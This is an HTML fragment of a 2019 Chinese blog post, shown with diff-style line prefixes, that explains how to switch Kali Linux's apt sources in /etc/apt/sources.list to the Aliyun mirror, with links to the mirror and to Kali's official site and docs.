-    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/16/Kali-%E4%BF%AE%E6%94%B9%E4%B8%BA%E9%98%BF%E9%87%8C%E4%BA%91%E9%95%9C%E5%83%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2019/11/16/Kali-%E4%BF%AE%E6%94%B9%E4%B8%BA%E9%98%BF%E9%87%8C%E4%BA%91%E9%95%9C%E5%83%8F/" class="post-title-link" itemprop="url">Kali 修改为阿里云镜像</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2019-11-16 00:00:00" itemprop="dateCreated datePublished" datetime="2019-11-16T00:00:00+08:00">2019-11-16</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Kali Linux is a Debian-derived Linux distribution designed for digital forensics and penetration testing. It is maintained and funded by Offensive Security Ltd</p>
-<p>下载地址: <span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLmFsaXl1bi5jb20va2FsaS8=">https://mirrors.aliyun.com/kali/<i class="fa fa-external-link-alt"></i></span></p>
-<p>相关仓库</p>
-<ul>
-<li>Kali安装源（kali-images）：<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuYWxpeXVuLmNvbS9taXJyb3Iva2FsaS1pbWFnZXM=">https://developer.aliyun.com/mirror/kali-images<i class="fa fa-external-link-alt"></i></span></li>
-</ul>
-<h2 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h2><p>修改 <code>/etc/apt/sources.list</code> , 将相关 url 改成阿里云的源。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ul>
-<li>官方主页: <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcv">https://www.kali.org/<i class="fa fa-external-link-alt"></i></span></li>
-<li>文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy8=">https://www.kali.org/docs/<i class="fa fa-external-link-alt"></i></span></li>
-</ul>
-
       
     </div>
 
